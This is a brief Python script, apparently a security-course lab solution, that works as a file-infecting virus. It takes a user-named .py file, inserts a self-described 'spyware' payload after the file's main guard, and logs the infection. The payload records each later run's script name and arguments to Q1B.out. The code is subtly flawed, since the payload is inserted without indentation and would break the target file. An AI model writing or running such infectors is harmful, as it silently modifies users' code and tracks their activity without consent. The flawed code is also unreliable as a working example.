import os
import sys

# Going into LabGen to find the files
os.chdir('/home/cse/Lab2/LabGen')

files = os.listdir('.')  # List of all files in the directory

payload = [
    "\nimport sys\n",
    "filename = sys.argv[0]\n",
    "with open('Q1B.out', 'a') as log:\n",
    "    log.write(f'{filename} was executed with arguments: {' '.join(sys.argv[1:])}\\n')\n"
]

target = False
UserInput = input("Name of .py File: ")

for f in files:
    if not f.endswith('.py'):  # Only target .py files
        continue
    elif f == UserInput:
        target = True
        break

if target:
    with open(UserInput, "r") as file:
        lines = file.readlines()

    # Check if the file is already infected
    already_infected = any("Q1B.out" in line for line in lines)

    # If not infected, proceed with infection
    if not already_infected:
        # Find where to insert the payload (after if __name__ == "__main__":)
        for i, line in enumerate(lines):
            if 'if __name__ == "__main__":' in line:
                lines.insert(i + 1, "".join(payload))  # Insert payload right after
        
        # Rewrite the file with the modified content
        with open(UserInput, "w") as file:
            file.writelines(lines)
        
        # Log the infection event
        with open("Q1B.out", "a") as log:
            log.write(f"{UserInput} has been infected with spyware.\n")

        print(f"{UserInput} has been infected with spyware.")
    else:
        print(f"{UserInput} is already infected.")
else:
    print(f"{UserInput} not found.")

# Changes back to Solutions for it to be stored here
os.chdir('/home/cse/Lab2/Solutions')